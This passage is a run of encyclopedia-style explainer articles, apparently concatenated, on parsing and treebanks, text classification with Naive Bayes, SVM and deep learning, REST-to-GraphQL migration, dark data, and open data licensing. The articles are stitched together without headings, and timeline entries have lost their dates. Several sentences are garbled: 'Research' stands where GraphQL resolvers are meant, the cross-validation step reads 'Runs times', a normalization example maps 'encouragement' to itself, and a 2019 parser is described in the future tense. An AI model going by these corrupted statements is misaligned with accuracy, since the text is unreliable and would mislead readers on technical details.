If we do n't have any such treebank , we can use the Expectation - Maximization ( EM ) algorithm to iteratively arrive at these probabilities .
Another approach is to let the probabilistic model account for lexicalized rules .
For example , a rule such as " VP & rarr ; VBD NP PP " is changed to " VP(dumped , VBD ) & rarr ; VBD(dumped , VBD ) NP(sacks , NNS ) PP(into , NN ) " .
It 's difficult to obtain probabilities when we 're so specific , but there are techniques to do this .
Two lexicalized parsers are Collins parser and Charniak parser .
Could you mention some text parsers that I can use ?
Sample output from Google Cloud Natural Language API .
Source : Nelson 2019 .
Commonly used Python NLP packages such as NLTK and spaCy have utilities for parsing .
FreeLing and Apache OpenNLP support parsing .
Berkeley Parser , Stanford Parser and Stanford CoreNLP support parsing .
The Stanford Parser includes a shift - reduce constituent parser and a neural network dependency parser .
In R , udpipe is the package to use for dependency parsing .
Two open source tools from Google include SLING and SyntaxNet .
Both of these are based on neural networks .
SLING is trained for semantic frames of interest .
Although written for computer languages , Aho and Ullman 's book ( 1972 ) is a classic reference that 's applicable for natural language parsing as well .
Noam Chomsky introduced Phrase Structure Grammar ( PSG ) in the 1950s .
While mainly used for syntax , it has found applications in semantics and phonology .
Historically , Dependency Grammar ( DG ) predates phrase structure grammar by many centuries .
However , the modern history of dependency grammar starts with the Frenchman Lucien Tesnière , whose main work was published posthumously .
Subsequently , DG advanced through the 1960s .
Patterns in the form of regular expressions can be used for parsing .
While regular expressions date back to the 1950s , it was in 1967 that Ken Thompson at Bell Labs brought regex from the world of mathematics to computer science for the first time .
In the 1970s , regular expressions made their way into some UNIX programs .
Penn Treebank is released .
It has 4.5 million words that are POS tagged .
One - third of these are also annotated with skeletal syntactic bracketing .
A treebank is a collection of text released with corresponding parse trees .
Treebanks like this one provide annotated datasets for training statistical models .
Two different simplified HPSG structures ( b ) and ( c ) .
Source : Zhou and Zhao 2019 , fig .
3 Pollard and Sag developed a highly lexicalized , constraint - based grammar called Head - driven Phrase Structure Grammar ( HPSG ) .
In 2004 , Miyao et al .
acquired this grammar from Penn Treebank .
In 2019 , Zhou and Zhao will develop a HPSG parser that gives better predictions on both constituent and dependency tree structures .
An example of IOB tagging applied to chunks .
Source : Bird et al .
2019b , fig .
2.5 .
Based on Brill 's earlier work ( 1992 ) on POS tagging using transformation - based learning , Ramshaw and Marcus adapt it to the problem of chunking by framing it as a tagging task .
Tags are introduced to denote the beginning ( B ) , internal ( I ) and outside part ( O ) of a chunk .
Later , this approach is called IOB tagging .
Dependency relations are useful in a number of NLP tasks .
Existing dependency parsers are not as robust or accurate as phrase structure parsers .
The Penn Treebank , and other treebanks trained on large corpora , provide only phrase structure parses .
As a solution to this problem , Stanford researchers come up with a system that automatically extracts typed dependency parses from phrase structure parses .
In time , this became popular as the Stanford Dependencies and led to Universal Dependencies that can be used for many natural languages .
With the release of SyntaxNet from Google , what is claimed to be the world 's most accurate English parser , Parsey McParseface , goes open source .
This is built using machine learning .
A neural network learns to resolve ambiguities .
Multiple possible interpretations of structure are preserved via beam search rather than selecting the first best interpretation .
On the Penn Treebank , this model achieves 94 % accuracy , which compares well against human accuracy of 96 - 97 % .
Text classification process .
Source : MonkeyLearn 2018 .
Abundant textual data accumulates in any eco - system , unstructured and in diverse formats .
To extract trends or meaningful insights from it , we need to sort data into different categories .
Text classification is a simple , powerful analysis technique to sort the text repository under various tags , each representing a specific meaning .
Typical classification examples include categorizing customer feedback as positive or negative , or news as sports or politics .
Machine Learning is used to extract keywords from text and classify them into categories .
Text classification can be implemented using supervised algorithms , Naïve Bayes , SVM and Deep Learning being common choices .
Text classification finds wide application in NLP for detecting spam , sentiment analysis , subject labelling or analysing intent .
Automating mundane tasks makes research , analysis and decision making faster and easier .
Text classification is very effective with historical data .
It can also be used for real - time textual input analysis .
What 's the scope of text classification ?
The document features extraction by sentence level analysis .
Source : Kowsari et al .
2019 , fig .
4 .
The scope of text classification is at document level , paragraph level , sentence level , or even sub - sentence level .
In some applications , we may assign one or more classes to an entire document .
In other applications , we may assign a class to each paragraph or sentence in the document .
An algorithm may be designed to accept syntax and semantic information at a sentence level .
This is then used to classify the document .
While sentence - level analysis is more granular , its limitation is that often sentence - level context can be determined only from sentences surrounding it .
What are the different methods for performing text classification ?
Some methods of text classification include the following : Manual classification : We could do the sorting manually like secretaries did in the olden days .
Assign categories to every incoming text .
Then group documents as per common categories .
This method will have the best accuracy , but is possible only for small quantities .
Hand - crafted rules for automated classification : A domain expert defines the rules for categorization .
For example , text with the words " shares , profits , equity , liabilities " is classified into the business category .
Text with the words " Messi , kick , Ronaldo , goal " is in the Football category .
Machine Learning Algorithms : Supervised techniques chosen based on dataset size and number of categories .
Hybrid techniques : Start with manual classification and assign categories to a small portion of the training dataset .
Then apply ML algorithms to extend to the rest of the dataset .
How does text classification work ?
How text classification works .
Source : MeaningCloud 2019 .
Let ’s work with a supervised classifier example to classify customer feedback into one of these categories : COMPLAINT , SUGGESTION , APPRECIATION .
The text may not explicitly include these words , so the categorisation has to happen based on interpretation of words present .
For the classifier to predict the correct label , it needs to ‘ understand ’ the essence of the text .
So we train the classifier with millions of similar customer feedback texts which already have one of these labels assigned .
After training , we allow the classifier to test its predictions .
Once desired accuracy levels are attained , the classifier can now be used to categorise new customer feedback .
With text classification , the algorithm does n’t care whether the user wrote standard English , an emoji , or an indirect reference ( poetry , sarcasm , movie quotes ) .
It only cares about the frequency of occurrence of particular text resulting in getting assigned to a category .
Let ’s say the words “ Out of this world ” occurs very frequently whenever very appreciative customer feedback is present in the test dataset .
The chance of a new prediction getting classified as “ APPRECIATION ” becomes very high now , if this phrase is encountered .
How do ML algorithms automate text classification ?
Naïve Bayes : Its common application is in spam filtering , to classify incoming emails / SMS as spam or not - spam .
We apply the conditional probability model of Baye ’s theorem to answer “ What is the probability the message is spam given the occurrence of the word X ?
” .
We assume that samples are independent and identically distributed .
Though this is often untrue , the prediction accuracy is reasonably good , especially for small sample sizes .
Support Vector Machines : For the same spam filtering , SVM offers better accuracy in results than Naïve Bayes since it uses an optimization technique .
However , it requires more computational resources .
SVM builds an optimal separating hyperplane which maximises the margin separating the categories ( Spam / Not Spam in our case ) .
Unlike Naive Bayes , SVM is a non - probabilistic algorithm .
Deep Learning : Works well when datasets are huge in size and continuously growing .
For spam filtering on a large scale ( huge dataset , large number of categories ) , RNN ( LSTM in particular ) would be highly effective as it gives weightage to the sequence of words appearing in the text .
Convolutional Neural Networks are a good choice for hierarchical document classification to recognize patterns in the text sequence .
How should I prepare the data for text classification ?
Data preparation for ML - based text classification involves the following : Tokenization : Identifying words , symbols , emojis , hyperlinks , based on known delimiters and format rules .
Word normalization : Reduce derived words into their root form ( developmental becomes development , encouragement becomes encouragement ) .
Text and feature encoding : ML models require numeric features and labels to provide a prediction .
So we created a data dictionary to map each word / feature in the document and each category labelled to a numerical ID .
( Example category codes : COMPLAINT - > 0 , SUGGESTION - > 1 , APPRECIATION - > 2 ) .
Feature representation : Every feature ( category ) is represented as a Word Count Vector ( giving the frequency count of each feature ) or a TF - IDF vector ( Term Frequency / Inverse Document Frequency ) representing the relative importance of a term in a document .
As an example , Microsoft Azure has a Feature Hashing module to convert features to integers for input into model .
Word / Document embedding : Every row in the dataset is an entire document , represented as a dense vector .
The word position within the vector is learned from text and based on the surrounding words .
Word embeddings can be trained using the input corpus , but pre - trained embeddings ( Glove , FastText , and Word2Vec ) are available .
How should I select features for text classification ?
Feature selection involves picking a small but optimal subset of terms from the training dataset to use as features ( categories ) during text classification .
Since vocabulary size reduces , computational efficiency during training improves . That 's critical for algorithms other than Naïve - Bayes .
Feature selection also helps minimise noise features , which increase classification errors when included .
Feature selection is essentially a process of dimensionality reduction .
Contrary to the belief that more categories means better classification , weaker models ( fewer but well - differentiated features ) deliver better accuracies when training data is limited .
Feature selection methods are classified into 4 types : Filter : A pre - processing step suitable for any ML algorithm .
Statistical tests are done for features and their correlation with the outcome variable .
Features are chosen based on test scores .
Feature / Response : continuous : Pearson ’s Correlation .
Wrapper : Based on greedy search algorithms , they choose optimal features for a specific ML algorithm .
Example : Step forward / backward feature selection ( Add / remove features 1 by 1 in round - robin fashion from feature set and evaluate performance ) Embedded : Feature selection is part of the ML algorithm training phase ( LASSO , Ridge Regression to reduce overfitting ) .
Hybrid : Mix of filter and wrapper methods .
What are the methods for evaluating the effectiveness of text classification ?
Cross - validation and hold - out tests are common evaluation methods to deduce how often a prediction was right ( true positives , true negatives ) and when it made a mistake ( false positives , false negatives ) .
N - fold cross - validation : Split dataset into N folds .
Runs times .
At a time , use one fold of data as a test set , the remaining N - 1 folds of data as training sets .
Classification accuracy is the average of results in N runs .
Hold - out test : Divide dataset into training and test subsets .
Varied splits will result in varied results and accuracy , especially for small datasets .
The Paired t - test can be used to measure significance in accuracy differences .
Well - known performance metrics used in assessment include accuracy , precision , recall and F1 score .
Classification error ( 1 - Accuracy ) is a sufficient metric if the percentage of documents in the class is high ( 10 - 20 % or higher ) .
However , for small classes , always saying ‘ NO ’ will achieve high accuracy , but makes the classifier irrelevant .
So precision , recall and F1 are better measures .
Other evaluation metrics include Matthews Correlation Coefficient ( MCC ) , ROC and AUC .
What are the factors behind the choice of an ML algorithm ?
A flowchart for selecting a text classification algorithm .
Source : Google Developers 2019 , fig .
5 .
There are some common pointers that can be followed to determine whether to choose a supervised or unsupervised algorithm .
The choice depends on the dataset size , accuracy required , training time or resources available .
For smaller datasets with humanly identifiable or limited categories , choose a Supervised algorithm .
For impossibly huge , ever growing datasets , or too many categories , choose Unsupervised algorithm or the ANN model .
While text classification is usually considered a supervised task , sometimes the term has been used for unsupervised tasks .
Text clustering is an example that identifies the categories before assigning them to documents .
Calculate the ratio number of samples / number of words per sample .
If this ratio is less than 1500 , tokenize the text as n - grams and use a simple multi - layer perceptron ( MLP ) model to classify them .
If the ratio is greater than 1500 , tokenize the text as sequences and use a CNN model to classify them .
How to adapt binary text classification techniques to multi - class problems ?
More classes means higher model complexity .
For a fixed dataset , binary classification gives better accuracy than multi - classes because of clear decision boundaries .
It ’s a common practice to reduce multi - class instances into binary classifiers before running ML algorithms .
Let ’s take a training set with 5 classes : " Class - A " , " Class - B " , " Class - C " , " Class - D " , " Others " .
We relabel data under " Class - ABCD " accumulating labels " Class - A " , " Class - B " , " Class - C " and " Class - D " .
Now it ’s a binary - classification problem with just 2 classes : “ Class - ABCD ” , “ Others ” .
A popular problem reduction technique called OAA ( One - Against - All ) is employed for this : For each of the 5 classes in our dataset , we create 5 new datasets D1 … D5 ( one per class ) For each dataset Di , we mark training data of the corresponding class i as positive and all others as negatives ( D2 : Class - B - > Positive , All others - > Negative ) We train 5 binary classifiers , each on their own dataset Di We get predictions from all binary classifiers .
Then choose the class with positive classifier output , breaking ties randomly .
An undesirable consequence is class imbalance .
As negative examples far outweigh positives , learning skews towards the negative class .
This is prevented by introducing relative weightages for each dataset .
What support is available in various programming languages and libraries ?
Briefly , we list some available resources : Python : Scikit - Learn : sample datasets , feature encoding , Ppediction and evaluation , TensorFlow : TF - Hub : training , prediction , evaluators , Java : Stanford CoreNLP , MALLET , WEKA , Lingpipe libraries , R : OpenNLP , Rweka RandolphVI maintains a list of useful neural network Python implementations for Multi - Label Text Classification .
This includes CNNs , RNNs , and attention networks .
Since the 1960s , the concept of classifying documents into categories has existed as a part of library science .
Several automated library management tools include this feature .
In the 1990s , text classification gained importance as an important NLP function .
With the availability of larger datasets and more categories , researchers apply ML - based classification .
For text classification , Support Vector Machines ( SVM ) and Maximum Entropy Models ( MEMs ) were applied in the late 1990s .
By the end of the decade , text classification is seen as a combination of information retrieval and machine learning .
It 's also seen as an application of text mining .
In the early part of 2000s , researchers looked at multi - label text classification .
Unlike topic modelling where topic candidates are ranked , text classification requires a definite set of topics .
Approaches include EM algorithms , Parametric Mixture Models ( PMM ) and multi - labelled MEMs .
Pang and Lee published a paper on sentiment classification based on Machine Learning techniques .
They propose a ' subjectivity detector ' that would filter out the sentences labelled ' subjective ' in a document and employ text categorization techniques on the resulting data .
They implement Naive Bayes and SVM to find minimum cuts in a graph .
They claim an accuracy of 86.4 % on the NB polarity classifier .
CNN for text showing two channels .
Source : Kim 2014 , fig .
1 .
CNNs are common for image processing but not in NLP .
Yoon Kim presents the idea of using CNN to classify text in a paper titled Convolutional Neural Networks for Sentence Classification .
The REST API coexists with the GraphQL API .
Source : Haldar 2019 .
While GraphQL has its limitations , there are many advantages that make it worthwhile to migrate existing REST APIs to GraphQL .
To reap these benefits , it 's important to think in terms of graphs rather than endpoints .
The migration itself can be done in one go for small projects .
An incremental approach is preferred for complex projects handled by large teams .
For most projects , it 's expected that current REST APIs will coexist with new GraphQL APIs .
This is because clients may not migrate to new app versions or update their code immediately .
In general , migration will involve building the GraphQL schema and writing the resources for that schema .
What 's a possible migration path from REST to GraphQL ?
Migration path from REST to GraphQL .
Source : Adapted from Mayorga 2018 .
Let 's assume that we 're using REST API and React client ( a ) .
We can start by keeping the REST endpoints but wrapping them with a GraphQL gateway ( b ) .
We need to define the GraphQL schema .
React client will now call a single GraphQL endpoint .
Research will use REST endpoints to fetch the data .
A natural evolution from here is to implement the GraphQL server ( c ) .
We can remove the gateway .
React client will directly call the new GraphQL API .
This has direct access to the database layer and therefore lower latency compared to the gateway architecture .
REST endpoints may coexist to support legacy clients .
A React client does imperative data fetching and might do manual client - side caching .
By migrating to Apollo Client , we can do declarative data fetching and zero - config caching .
By using Apollo Link REST , we do n't even need changes on the server side .
This could be an easy way to get started .
The final goal is to have GraphQL API and Apollo Client ( d ) .
To design for GraphQL , what sort of mindset should I have ?
Visualize the graph when designing a GraphQL API .
Source : Engledowl 2017 .
One study found that reducing the number of API calls by migrating to GraphQL is not a trivial exercise .
Suppose the current code is organized to consume small amounts of data returned by specific REST endpoints .
Refactoring this into fewer endpoints that return large graph structures requires a graph - based mindset .
Developers have to stop thinking in terms of endpoints and start thinking in terms of graphs .
It 's important to understand this before designing the GraphQL schema .
A typical endpoint - based approach is to ask , " What pages are there and what data each of them needs ?
" With a graph - based approach , we should instead focus on the data and its relationships , and seek to expose these to clients .
Consider a blogging site .
Let 's think about exposing user information .
Relationships with the user might include posts , comments , liked articles , groups , etc .
Thus , we are building a graph around the user .
Relationships are bidirectional .
When focusing on a comment , we should also link it back to the user .
In short , think in graphs , not endpoints .
Describe the data , not the view .
How is TypeScript relevant to GraphQL ?
Type consistency from database to server code to client code .
Source : Shtatnov and Ranganathan 2018 .
Unlike Vanilla JavaScript , TypeScript gives type safety on the client side .
GraphQL gives type safety on the server side .
Suppose we have a client that uses only JavaScript .
If this client makes a query to the GraphQL server in which the types do n't match .
This error will be caught by the server during runtime .
Instead , if the client code had been in TypeScript , such a mismatch would have been caught during the build process .
We can deploy our code with a lot more confidence .
A good approach is to define a GraphQL schema and then use tools to auto - generate TypeScript types for the front - end .
Ideally , we could extend this to the database layer so that from the browser to the database , types are consistent .
In general , we should strive for type consistency systemwide .
At Airbnb , they defined Thrift IDL that was then compiled into a GraphQL schema .
Moreover , they then automatically generate TypeScript types from the GraphQL schema .
Should I implement caching for my GraphQL service ?
Caching avoids duplicate REST calls .
Source : Shtatnov and Ranganathan 2018 .
A single client query can trigger multiple resolvers .
GraphQL resolvers run as independent units .
This has the benefit that even if some of them fail , the ones that succeed return the requested data to the client .
One problem is that across resolvers there could be many duplicate calls to REST endpoints .
It 's to solve this problem that a caching layer is helpful .
Resolvers need not worry about optimizing their calls to REST endpoints .
At Airbnb , engineers approached this problem via what they call a data - centric schema and a data hydration layer .
At another level , we can cache client request - response .
Since GraphQL does n't support HTTP - level caching , we need an alternative .
It 's possible to use application - level caching , such as Spring Boot caching .
Database queries can also be optimized via caching .
Could you share some case studies on migrating to GraphQL ?
At Netflix , the same graph model powered different views .
Source : Shtatnov and Ranganathan 2018 .
At Netflix , the Marketing Technology team adopted GraphQL to solve their network bandwidth bottlenecks .
Their use cases were complex and building custom REST endpoints for each page was cumbersome .
GraphQL matched their graph - oriented data structures .
They could roll out features a lot faster .
A GraphQL middle layer reduced the number of direct calls from the browser .
Instead , server - to - server calls within the data centre gave an 8x performance boost .
The payload of 10 MB was reduced to 200 KB .
At Airbnb , they reconciled legacy presentation services with GraphQL by having Thrift / GraphQL translators per service .
These services were then exposed to clients via a GraphQL gateway service .
At PayPal , a user checkout involves many round trips .
Reducing round trips with REST meant overfetching data .
They also found that UI developers spent less time building UI .
Mostly , they were trying to figure out where and how to fetch data .
After moving to GraphQL , data performance and developer productivity improved .
Interested readers can head to the official GraphQL website that shares a number of GraphQL case studies .
Are there tools that help with GraphQL migration ?
GraphiQL is an in - browser IDE .
Via GraphiQL , you can look at the schema , make queries and look at the responses .
GraphQL Editor , GraphQL Playground and GraphQL Voyager are other useful tools .
Apollo Server and Apollo Client provide server and client - side implementations of GraphQL .
Apollo Client can integrate with React , Angular or Vue frameworks .
As an alternative to Apollo Client , there 's Relay to act as a bridge between GraphQL and React .
There are many tools that can read your REST API files and export GraphQL schema .
Apimatic 's API Transformer is one such tool .
Input files can be in various formats such as OpenAPI , RAML , or API Blueprint .
This tool can also migrate SOAP users by translating WSDL files .
Some clients may want to use only REST .
To avoid maintaining two codebases , we can have a GraphQL schema and generate REST APIs from it .
Sofa is a Node.js package that does this .
How do I map REST features to their equivalent GraphQL features ?
Using REST , a client would make an endpoint call , parse the response and make further calls to get all the relevant data .
This is the N+1 problem .
This can be solved using the nested API design but this leads to overfetching .
With a well - designed GraphQL API , clients should be able to and request only relevant data with a single API call .
Moreover , we should make use of connections .
A connection encapsulates the queried node and other nodes to which it 's connected by edges .
This comes directly from the underlying graph - based data abstraction .
In REST , we paginate with a query string such as ` ?
limit=1&page=2 ` .
Cursor - based pagination is the GraphQL equivalent .
It 's typically used with connections using arguments ` first ` , ` last ` , ` offset ` or ` after ` .
In REST , POST , PUT or DELETE requests modify data .
In GraphQL , clients can instead use mutations .
We could define mutations to create , update or delete items .
GraphQL prefers serving a versionless API and avoids breaking changes as the API evolves .
Clients only request what they need and understand .
In REST , the practice has been to serve different versions .
Could you share some tips and best practices for moving to GraphQL ?
GraphQL should be a thin layer .
Tasks such as authentication , caching or database queries should happen below the GraphQL service layer .
By doing this , applications will be more resilient to changes in platforms or services .
Likewise , name your fields in a self - documenting manner .
Once clients start using them , it becomes hard to change later .
Do n't force clients to replace all their REST endpoint calls to GraphQL .
Instead , allow them to adopt GraphQL incrementally .
The Shopify documentation shows how responses from REST endpoints can include GraphQL IDs that can be used for subsequent GraphQL queries .
Research should be thin and fetch data asynchronously .
Fetch data at field level and de - duplicate requests using a library such as DataLoader .
Server logs help in debugging GraphQL calls .
To debug within the browser , includes logging into the response payload when enabled by a flag .
With GraphQL , we often fetch partial objects that ca n't be directly used in methods that need full objects .
Use duck typing to get around this .
Facebook open source GraphQL , which has also been released as a draft specification .
The development of GraphQL within Facebook can be traced back to 2012 .
GraphQL performs better than REST .
Source : Brito et al .
2019 .
Brito et al .
compare the performance of GraphQL against REST using seven open source clients called GitHub and arXiv APIs .
They also make typical queries noted in recent papers presented at engineering conferences .
They find that GraphQL results in 94 % less number of fields fetched and 99 % less number of bytes .
These are median values .
However , there 's no significant reduction in the number of API calls .
GraphQL migration journey at Airbnb .
Source : Devopedia 2019 .
Airbnb engineer Brie Bunge shares Airbnb 's migration journey to GraphQL .
They adopted an incremental approach , making sure the app is always shippable and regression - free .
As pre - requisite , they set up GraphQL on the backend and adopted TypeScript on the frontend .
Migration itself has five stages .
The approach was to first replace REST with GraphQL .
Refactoring and optimizations were done later .
Dimensions of dark data .
Source : Imaginea Technologies 2019 , slide 4 .
Organizations typically collect , process and store lots of information in the normal course of their operations .
A lot of this is done simply for compliance purposes .
However , the same data could be useful to plan product roadmaps , aid business decisions or optimize operations .
This is possible today due to modern techniques of machine learning and data analytics .
Dark data is simply data that 's available to organizations but not being used .
The term " dark " does not refer to something evil or illegal .
Nor is it specifically about security or privacy .
Rather , it 's about data that 's hidden from view , easy to ignore , and hard to access or analyse .
In physics , we know that dark matter comprises most of the universe .
Similarly , dark data is a lot bigger than data that organizations typically analyse to aid decision making .
Could you explain dark data with some examples ?
Basics of dark data .
Source : Accenture YouTube 2019 .
Consider a banking application for credit card approval .
The focus is on customer information and eligibility .
However , how the user arrived at the online form could be useful information .
This data is available but is not used .
In the medical domain , paper records are digitized .
These are used by doctors .
Since they are stored as scanned images , information retrieval or analysis systems ignore them .
Another example is when a business acquires users or gathers feedback via different channels .
Call centre logs are captured as audio files whereas website visits are captured as web server logs .
This is another source of dark data when new insights are inaccessible just because data sources exist independently and ca n't be easily combined .
Consider the Accounts Payable department .
Dark data could include overviews in the ERP system , previous transactions , account history , CRM information , and so on .
This data is not just unused but also presents a risk due to its sensitive and confidential nature .
What are the different types or sources of dark data ?
Some types of dark data .
Source : Javanainen 2016 .
Dark data is different in each industry .
Some categories of dark data include customer information , ex - employee information , log files , survey data , financial statements , notes , presentations , emails , email attachments , inactive databases , old versions of documents , call - centre transcripts , customer reviews , etc .
Dark data has come about because organizations realize that data is valuable and storage is cheap .
So they end up storing lots of it without using it properly .
Data lakes and their associated technologies help store large volumes of multiformat data .
An important reason for dark data is big data .
Big data 's traits ( volume , variety and velocity ) make it difficult for organizations to process it .
So they store it and defer the processing until later .
From this perspective , the term " dusty data " has been used .
Where credibility of data is essential , data that ca n't be traced to its source wo n't be used for analysis .
How does dark data differ from unstructured data ?
Dark data is not just unstructured data .
Source : Systems Innovation 2018 , 3:00 .
Often , dark data is unstructured because unstructured data is harder to analyse .
Unstructured data " becomes dark " when organizations do n't have the know - how to analyse it and obtain insights .
However , structured data can also be part of dark data .
For example , two structured datasets might exist independently in their own silos .
If they were to be combined , new insights could be obtained .
Combining two datasets might not be trivial , particularly when they exist in different formats , stored in different systems or controlled by different teams .
In general , dark data can be structured or unstructured , but they share some common characteristics .
Data might be redundant , obsolete or trivial .
This view expands the definition of what dark data is .
It 's not just valuable data that 's not used , but also useless data that 's simply taking up storage space .
How can I make use of or analyse dark data ?
Those who manage dark data should regularly do audits and attempt to structure the data .
You may decide not to dump dark data but it should be encrypted and stored in a secure manner .
For unstructured data , at least attach metadata labels , so they can be easier to find for future analysis .
Classify or organize data in a single repository so that users can find them faster .
Before dark data can throw up insights , you have to ask the right questions , questions that are relevant to your business .
The question could be about ' What ' or ' Why ' .
Each type of question might need a different approach .
Tools to work with dark data include DeepDive , Snorkel , and Dark Vision .
Docugami is a company that 's looking at ways to enable computers to understand documents written by and for humans .
They call the problem " document dysfunction " .
Any effort to use dark data manually will be almost impossible .
Automation is the key .
Robotic Process Automation ( RPA ) can be enhanced with cognitive abilities to understand dark data .
A researcher at Gartner mentions the term Dark Data in a blog post .
This may well be the first mention of the term .
He notes that dark data is stored " just in case it might come in handy " at a later point .
To get any value out of dark data , it 's important that business users ask the right questions .
In subsequent literature , Gartner is credited with coining the term .
Gartner Research publishes a report titled Innovation Insight : File Analysis Innovation Delivers an Understanding of Unstructured Dark Data .
Two months later , Gartner published a separate article on Dark Data in its online glossary of information technology terms .
IBM reports that 90 % of IoT sensor data is not used .
Moreover , 60 % of this data loses its value within milliseconds .
Technologies that allow us to process this data in almost real time are therefore critical .
If not , we end up with dark data .
A study by Veritas involving 22 countries shows that 52 % of all data collected by organizations is dark .
They say it 's data " beneath the line of sight of senior management " .
Chan Zuckerberg Initiative ( CZI ) acquired Meta , which is a search engine focused on scientific literature .
This is an effort to unlock the value in dark data .
Apple acquired Lattice Data that specializes in dark data .
Lattice Data commercialized DeepDive , a tool developed at Stanford University .
DeepDive uses machine learning to convert dark data into structured data that can be combined within existing structured data sources .
DeepDive extracts relationships and makes inferences .
Its development can be traced back to 2014 .
Some folks extend the definition of dark data to include data that 's hidden behind firewalls or not accessible by search engines .
Thus , dark data includes data from the deep web as well .
The data spectrum .
Source : ODI Standards 2019a .
The idea of open data is to share data freely with others .
Openness also allows others to modify , reuse or redistribute the data .
Openness has two facets : legal and technical .
Legal openness is about applying a suitable open license to the data .
Technical openness is about removing technical barriers and making it easy to access , read , store or process data .
By opening up data , others can unlock value in the form of information and knowledge .
For example , in the travel sector , locations , images , prices and reviews are data that can help us plan a holiday .
Information is data within a given context .
Knowledge personalizes information and helps us make decisions .
Many organizations worldwide promote open data .
Open licenses , datasets and tools are available .
Governments are releasing open data that citizens can use .
Could you describe open data ?
A database is really about structure and organization of data , also known as the database model .
This is generally covered by copyright .
In the context of open data , we 're more concerned with the contents of the database , which we simply call data .
Data can mean a single item or an entire collection .
Particularly for factual databases , a collection can be protected but not individual items .
For example , a protected collection may be about the melting point of various substances , but no one can be prevented from stating a particular item , such as element E melts at temperature T. To understand the meaning of openness , we can refer to the Open Definition that states , " Open means anyone can freely access , use , modify , and share for any purpose ( subject , at most , to requirements that preserve provenance and openness ) .
" Open data should be accessible at a reasonable cost if not free .
It should be available in bulk .
There should n't be restrictions on who or for what purpose they wish to use the data .
Tools to use the data should be freely available and not proprietary .
Data should n't be locked up behind passwords or firewalls .
Where could open data be useful ?
A still from an animation of wind speeds based on open data from the US National Weather Service .
Source : Tauberer 2014 , fig .
1 .
Open data can make governments more transparent .
Citizens will have confidence that their money is being spent as budgeted or on implementing the right policies .
For example , one activist noted that Canadian citizens used open data to save their government $ 3.2bn in fraudulent charitable donations .
In Brazil , DataViva provides millions of interactive visualizations based on open government data .
New business opportunities are possible .
For example , once Transport for London opened their data , developers used it to build apps .
Likewise , Thomson Reuters uses open data to provide better services to its customers .
OpenStreetMap and Copernicus are examples that enable new GIS applications .
In research , open data is a part of what is called Open Science .
It leads to reproducible research and faster advancements .
Open data also enables researchers to revalidate their own findings .
Open data can be used to protect the environment .
Some apps that do this include mWater , Save the Rain and Ecofacts .
Could you mention some sources of open data ?
Types of data that could be opened .
Source : James 2013 .
There are many curated lists on the web for open data .
From some of these , we mention a few useful sources of open data by category : General : DBpedia , Datasets Subreddit , Kaggle , FiveThirtyEight , Microsoft Marco Government : Data.gov , Data.gov.uk , European Union Open Data Portal Economy : World Bank Open Data , Global Financial Data , International Monetary Fund Business : OpenCorporates , Yellowpages , EU - Startups , Glassdoor Health & Science : World Health Organization , HealthData.gov , NHS Digital , Open Science Data Cloud , NASA Earth Data , LondonAir Research : Google Scholar , Pew Research Center , OpenLibrary Data Dumps , CERN Open Data Environment : Climate Data Online , IEA Atlas of Energy Which are some organizations working with or for open data ?
We mention a few organizations : Open Data Institute : Works with companies and governments to build an open , trustworthy data ecosystem , where people can make better decisions using data and manage any harmful impacts .
Open Data Commons : Provides a set of legal tools to publish and use open data .
They 've published open licenses applicable to data .
Open Knowledge Foundation : A worldwide network of people passionate about openness , using advocacy , technology and training to unlock information and enable people to work with it to create and share knowledge .
It was briefly called Open Knowledge International .
The Open Definition is one of their projects .
Open Data Charter : A collaboration between governments and organisations working to open up data based on a shared set of principles .
Why and what aspects of open data should we standardize ?
Aspects of open data that can be standardized .
Source : Dodds 2018 .
Data is more valuable if we can combine two different datasets to obtain new insights .
Interoperability is the key .
Given diverse systems , tools and data formats , interoperability can be almost impossible .
Without standards , it will become more difficult for us to publish , access or share data effectively .
Standards also make it easier to repeat processes , compare results and reach a shared understanding .
Moreover , we need open standards that are available to the public and are defined through collaboration and consensus .
Open standards should define a common data model .
The data pipeline should be streamlined .
It should be easy to combine data .
It should promote common understanding .
The Open Data Institute 's page on standards is a useful resource to learn more .
A checklist for selecting a suitable standard looks at the licensing , project needs , maintenance of the standard , and guidance on usage .
What sort of licensing should I adopt when opening my data ?
Open data licenses that conform to Open Definition .
Source : Open Definition 2019a .
Releasing your data without a license creates uncertainty .
In some jurisdictions , data lacking explicit permission may be protected by intellectual property rights .
It 's therefore better to get a license .
Aspects that define a license include public domain , attribution , share - alike , non - commercial , database only and no derivatives .
There are a number of licenses that conform to Open Definition .
Creative Commons CC0 is an example .
It releases the data into the public domain .
Anyone can copy , modify and distribute , even for commercial purposes , without asking for permission .
A similar license is Open Data Commons Public Domain Dedication and Licence ( PDDL ) .
Other conformant but less reusable licenses are data licenses from governments ( Germany , UK , Canada , Taiwan ) .
The UK 's Open Government Licence is an example .
Two other licenses worth looking at come from the Linux Foundation : CDLA – Sharing-1.0 and CDLA - Permissive-1.0 , where CDLA refers to the Community Data License Agreement .
The Open Data Commons Open Database License ( ODC - ODbL ) is seen as a " viral license " .
Any changes you make to the dataset , you 're required to release the same under this license .
What are some challenges with open data ?
Publishers continue to use customized licenses .
This makes it hard to reuse data .
It makes licenses incompatible across datasets .
Instead , they should use standardized open licenses .
Ambivalent or redundant clauses cause confusion .
Licenses often are not clear about the data to which they apply .
Data is often not linked to legal terms .
Data is hard to find .
Sometimes their locations change .
A platform such as CKAN might help .
Data could be misinterpreted , which could result in a wrong decision .
This creates a fear of accountability and prevents producers from opening their datasets .
Quality of data is another concern .
Data should be machine - readable and in raw form .
Publishing data in HTML or PDF is not research - friendly .
For context and interpretation , metadata should be shared .
Raw data is good but also requires advanced technical skills and domain knowledge .
We therefore need to build better data literacy .
AI algorithms are being used to analyse data but many are black - box models .
They also promote data centralization and control , which are at odds with the open data movement .
Data infrastructure must be of consistent quality .
Data can also be biased by gender or against minority groups .
The concept of open data starts with Robert King Merton , one of the fathers of the sociology of science .
He explains how freely sharing scientific research and results can stimulate growth and innovation .
In the US , the Government Printing Office ( GPO ) goes online and opens a few government - related documents .
This is an early example of open government data at a time when the Internet was becoming popular .
Historically and legally , the idea can be traced back to the Freedom of Information Act of 1966 .
The Open Knowledge Foundation creates the Open Definition .
This is based on established principles from the open source movement for software .
This definition was later translated into more than 30 languages .
In November 2015 , Open Definition 2.1 was released .
At a TED talk , Hans Rosling presents compelling visuals of global trends in health and economics .
Using publicly available datasets from different sources , he debunks myths about the developing world .
He makes a case for governments and organizations to open up their data .
Data must be enabled using design tools .
His mantra is to animate and liberate data from closed databases .
Data must also be searchable .
